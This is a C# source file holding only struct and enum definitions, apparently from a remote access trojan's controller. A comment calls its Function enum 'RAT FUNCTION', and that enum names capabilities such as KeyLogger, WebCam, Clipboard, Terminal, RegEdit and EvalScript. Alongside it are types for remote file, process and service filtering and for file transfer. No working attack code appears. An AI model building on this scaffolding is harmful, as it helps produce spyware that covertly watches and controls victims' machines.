//SERVER STATUS
public struct SS
{
    public string IP;
    public int Port;
    public int online;

    public int upload;
    public int download;
}

//FILE FILTER
public struct file_F
{
    public string pattern;
    public bool regex;
    public bool ignore_case;

    public string exts; //EXTENSION

    public bool file;
    public bool folder;

    public bool use_date;
    public bool cd; //CREATION DATE
    public bool md; //MODIFIED DATE
    public bool ad; //LAST ACCESSED DATE
    public long date_initial;
    public long date_final;

    public bool check_size;
    public int size_init;
    public int size_final;
}
public struct file_Info
{
    public string path;
    public bool file;
    public string priv;
    public string size;
    public string cd;
    public string md;
    public string ad;
}

public struct Proc_F
{
    public string pattern;
    public bool regex;
    public bool ignore_case;
    public int pid;
}

public struct serv_F
{
    public string pattern;
    public bool regex;
    public bool ignore_case;
    public int pid;
}

public struct conn_F
{
    public string pattern;
    public bool regex;
    public bool ignore_case;
}

public struct pip_F
{
    public string pattern;
    public bool regex;
    public bool ignore_case;
}

//RAT FUNCTION, IT IS STORED IN CONTROL'S TAG
public enum Function
{
    Details,
    FileManager,
    ShowImage,
    ReadFile,
    WGET,
    Terminal,
    WMIC,
    RegEdit,
    Process,
    Service,
    Connection,
    PCControl,
    ClientConfig,
    RemotePlugin,
    pip_Manager,
    KeyLogger,
    Monitor,
    WebCam,
    Clipboard,
    EvalScript,
}

//UPLOAD AND DOWNLOAD FILE CODE
enum UDF_Code
{
    Next, //NEXT FILE
    Wait, //WAIT UNTILE CODE TURNS TO Next.
    Stop, //ERROR OR STOP, BREAK LOOP.
    Done, //ACTION COMPLETED.
}

//LOADED MODULE TYPE
enum rp_Type
{
    PIP,
    REMOTE,
}

//LOG TYPE
public enum log_Type
{
    SYSTEM,
    TRANSPORT,
    KEYEXCHANGE,
    ERROR,
}

public enum FileFilter
{
    TXT, 
    CSV,
}